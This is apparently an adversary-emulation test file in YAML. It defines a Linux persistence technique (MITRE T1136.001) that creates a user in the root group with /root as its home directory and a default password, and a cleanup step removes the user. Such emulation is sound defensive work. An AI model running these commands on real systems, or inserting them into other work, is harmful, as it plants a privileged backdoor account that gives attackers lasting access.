api_version: "2.0"
name: Create a new user in Linux with `root` UID and GID.
description: |
    Creates a new user in Linux and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.
args:
    - name: username
      type: string
      default: butter
    - name: password
      type: string
      default: BetterWithButter
uuid: a1040a30-d28b-4eda-bd99-bb2861a4616c
mitre:
    tactics:
        - 'TA0003: Persistence'
    techniques:
        - 'T1136: Create Account'
    subtechniques:
        - 'T1136.001: Local Account'
requirements:
    platforms:
        - os: linux
steps:
    - name: create-a-new-user-in-linux-with-`root`-uid-and-gid.
      inline: |
        useradd -g 0 -M -d /root -s /bin/bash {{.Args.username}}
        if [ $(cat /etc/os-release | grep -i 'Name="ubuntu"') ]; then echo "{{.Args.username}}:{{.Args.password}}" | sudo chpasswd; else echo "{{.Args.password}}" | passwd --stdin {{.Args.username}}; fi;
      executor: bash
      cleanup:
        inline: |
            userdel {{.Args.username}}
        executor: bash
